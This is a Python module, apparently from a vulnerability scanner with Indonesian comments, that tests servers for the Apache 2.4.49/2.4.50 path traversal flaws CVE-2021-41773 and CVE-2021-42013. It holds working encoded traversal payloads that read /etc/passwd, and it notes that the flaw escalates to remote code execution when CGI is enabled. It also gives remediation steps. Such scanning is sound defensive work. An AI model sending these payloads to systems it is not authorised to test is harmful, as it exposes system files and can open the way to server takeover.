"""Apache 2.4.49 / 2.4.50 path traversal (CVE-2021-41773 / CVE-2021-42013).

Auto-validation: kirim payload `..%2e/` ke /cgi-bin/ dan validasi konten
`/etc/passwd` muncul di response (`root:x:0:0:`). Hanya raise Finding bila
benar-benar terbukti -> confidence=confirmed.
"""
from __future__ import annotations

from urllib.parse import urljoin

from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig

PAYLOADS = [
    "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
    "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd",
    "/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd",
    "/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
]
SIGNATURE = "root:x:0:0:"


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    client = HttpClient(config)
    try:
        for payload in PAYLOADS:
            url = urljoin(target.origin + "/", payload.lstrip("/"))
            r = client.get(url, allow_redirects=False)
            if r is None:
                continue
            body = r.text or ""
            if r.status_code == 200 and SIGNATURE in body:
                findings.append(Finding(
                    module="apache_path_confusion",
                    title="Apache Path Traversal RCE/LFI (CVE-2021-41773 / 42013) terkonfirmasi",
                    severity=Severity.CRITICAL,
                    description=(
                        "Server Apache (kemungkinan 2.4.49 atau 2.4.50) memantulkan "
                        "isi /etc/passwd ketika diberi path-traversal terkode-ganda. "
                        "Bila mod_cgi/mod_cgid juga aktif, celah ini langsung naik "
                        "menjadi Remote Code Execution."
                    ),
                    target=url,
                    urls=[url],
                    evidence=f"GET {url} -> 200, body memuat '{SIGNATURE}'",
                    cwe="CWE-22",
                    confidence="confirmed",
                    remediation=(
                        "Upgrade Apache ke 2.4.51 atau lebih baru. Tambahkan "
                        "`Require all denied` pada `<Directory />`. Pastikan "
                        "mod_cgi/mod_cgid dimatikan kecuali benar-benar dibutuhkan."
                    ),
                    references=[
                        "https://httpd.apache.org/security/vulnerabilities_24.html",
                        "https://nvd.nist.gov/vuln/detail/CVE-2021-41773",
                        "https://nvd.nist.gov/vuln/detail/CVE-2021-42013",
                    ],
                ))
                break
    finally:
        client.close()
    return findings
